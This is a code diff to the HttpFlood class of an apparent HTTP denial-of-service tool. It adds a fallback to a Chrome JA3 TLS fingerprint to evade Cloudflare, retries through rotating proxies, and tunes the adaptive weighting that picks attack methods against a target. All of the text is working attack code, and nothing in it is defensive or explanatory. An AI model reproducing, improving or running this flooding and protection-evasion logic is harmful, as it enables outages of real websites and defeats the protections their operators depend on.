@@ -7289,6 +7289,25 @@ class HttpFlood(Thread):
         if HAS_TLS_CLIENT:
             method_map["STEALTH_JA3"] = self.STEALTH_JA3
         
+        # [V52.6] AUTO-FALLBACK: If raw socket connections failing >50%, switch to STEALTH_JA3
+        # Raw sockets fail against Cloudflare because TLS fingerprint is wrong.
+        # tls_client (STEALTH_JA3) uses Chrome's exact JA3 → passes Cloudflare.
+        conn_failures = intel.get("connection_failures", 0)
+        total_exec = intel["total_executions"]
+        if total_exec > 20 and conn_failures > total_exec * 0.5 and HAS_TLS_CLIENT:
+            # More than 50% connections failing — force STEALTH_JA3 as primary
+            if not intel.get("_stealth_fallback_announced"):
+                intel["_stealth_fallback_announced"] = True
+                print(f"{bcolors.WARNING}[V52.6] HIGH CONNECTION FAILURE RATE ({conn_failures}/{total_exec}). "
+                      f"Switching to STEALTH_JA3 (Chrome TLS fingerprint bypass).{bcolors.RESET}")
+            # Boost STEALTH_JA3 weight massively
+            weights["STEALTH_JA3"] = max(weights.get("STEALTH_JA3", 0), 300)
+            # Also boost POST_DYN which uses urllib (not raw socket)
+            weights["POST_DYN"] = max(weights.get("POST_DYN", 0), 150)
+            # Reduce raw socket methods
+            for raw_m in ("GET", "POST", "STRESS", "PPS", "SLOW_V2"):
+                weights[raw_m] = max(weights.get(raw_m, 0) // 4, 1)
+        
         chosen_name = "GET"  # Fallback
         
         # [V52.2] REST waves disabled — continuous fire is the doctrine
@@ -7429,36 +7448,53 @@ class HttpFlood(Thread):
         pre_errors = int(ERROR_COUNT)
         pre_requests = int(REQUESTS_SENT)
         
-        # Execute the chosen attack vector
-        try:
-            chosen_func()
+        # [V52.6] Execute with RETRY logic — if connection fails, try again with different proxy
+        max_retries = 3
+        for attempt in range(max_retries):
+            pre_requests_attempt = int(REQUESTS_SENT)
+            try:
+                chosen_func()
+            except Exception:
+                pass
             
-            # Phase 4: OBSERVE outcomes
-            post_burned = len(BURNED_PROXIES)
-            post_errors = int(ERROR_COUNT)
-            post_requests = int(REQUESTS_SENT)
-            
-            got_blocked = post_burned > pre_burned
-            got_errors = post_errors > pre_errors + 2
-            got_5xx = False
-            if post_requests == pre_requests and post_errors > pre_errors:
-                got_5xx = True
-            
-            # Phase 5: ADAPT with reinforcement learning
-            if got_blocked or got_errors:
-                self._chaos_learn(chosen_name, False, got_5xx)
-                if got_5xx:
-                    self._chaos_log_event("5XX", f"{chosen_name} triggered server error")
-                if got_blocked:
-                    self._chaos_log_event("BLOCKED", f"{chosen_name} was blocked by WAF")
-                # Phase 6: RETRY ESCALATION - If method failed, try stronger variant
-                if got_blocked and intel["phase"] in ("ASSAULT", "FINISH"):
-                    self._chaos_retry_escalate(chosen_name, method_map)
-            else:
-                self._chaos_learn(chosen_name, True, got_5xx)
+            post_requests_attempt = int(REQUESTS_SENT)
+            if post_requests_attempt > pre_requests_attempt:
+                break  # Requests went through, stop retrying
+            # If no requests sent, retry (will get a different random proxy)
+        
+        # Phase 4: OBSERVE outcomes
+        post_burned = len(BURNED_PROXIES)
+        post_errors = int(ERROR_COUNT)
+        post_requests = int(REQUESTS_SENT)
+        
+        got_blocked = post_burned > pre_burned
+        got_errors = post_errors > pre_errors + 2
+        got_5xx = False
+        if post_requests == pre_requests and post_errors > pre_errors:
+            got_5xx = True
+        
+        # [V52.6] FIX: If NO requests were sent at all, this is a FAILURE, not a success
+        # The old code treated silent failures (suppress(Exception)) as successes
+        requests_sent_this_cycle = post_requests - pre_requests
+        connection_failed = (requests_sent_this_cycle == 0)
+        
+        # Phase 5: ADAPT with reinforcement learning
+        if got_blocked or got_errors or connection_failed:
+            self._chaos_learn(chosen_name, False, got_5xx)
+            if got_5xx:
+                self._chaos_log_event("5XX", f"{chosen_name} triggered server error")
+            if got_blocked:
+                self._chaos_log_event("BLOCKED", f"{chosen_name} was blocked by WAF")
+            if connection_failed and not got_blocked and not got_errors:
+                intel["connection_failures"] = intel.get("connection_failures", 0) + 1
+            # Phase 6: RETRY ESCALATION - If method failed, try stronger variant
+            if got_blocked and intel["phase"] in ("ASSAULT", "FINISH"):
+                self._chaos_retry_escalate(chosen_name, method_map)
+        else:
+            self._chaos_learn(chosen_name, True, got_5xx)
                 
-            # Periodic status report (every 200 executions)
-            if intel["total_executions"] % 200 == 0 and intel["total_executions"] > 0:
+        # Periodic status report (every 200 executions)
+        if intel["total_executions"] % 200 == 0 and intel["total_executions"] > 0:
                 elapsed = int(time() - intel["attack_start_time"])
                 
                 # Target health indicator (via External IP Probe)
@@ -7528,7 +7564,7 @@ class HttpFlood(Thread):
                         bm = 'Calibrating...'
                 print(f"  Best Method : {bcolors.OKGREEN}{bm}{bcolors.RESET}")
                 print(f"  Weakpoint   : {bcolors.WARNING}{intel.get('target_weakpoint', 'Scanning...')}{bcolors.RESET}")
-                print(f"  Burned IPs  : {len(BURNED_PROXIES)}")
+                print(f"  Burned IPs  : {len(BURNED_PROXIES)} | Conn Failures: {intel.get('connection_failures', 0)}")
                 # [V52] Show real latency from direct ping, not stale health_history
                 hp = intel.get("health_history", [])
                 if hp:
@@ -7680,9 +7716,6 @@ class HttpFlood(Thread):
                 print(f"{bcolors.OKCYAN}================================================================{bcolors.RESET}")
                 print(f"")
                 
-        except Exception:
-            self._chaos_learn(chosen_name, False)
-        
         # Auto-save memory every 500 executions
         if intel["total_executions"] % 500 == 0 and intel["total_executions"] > 0:
             self._chaos_save_memory()
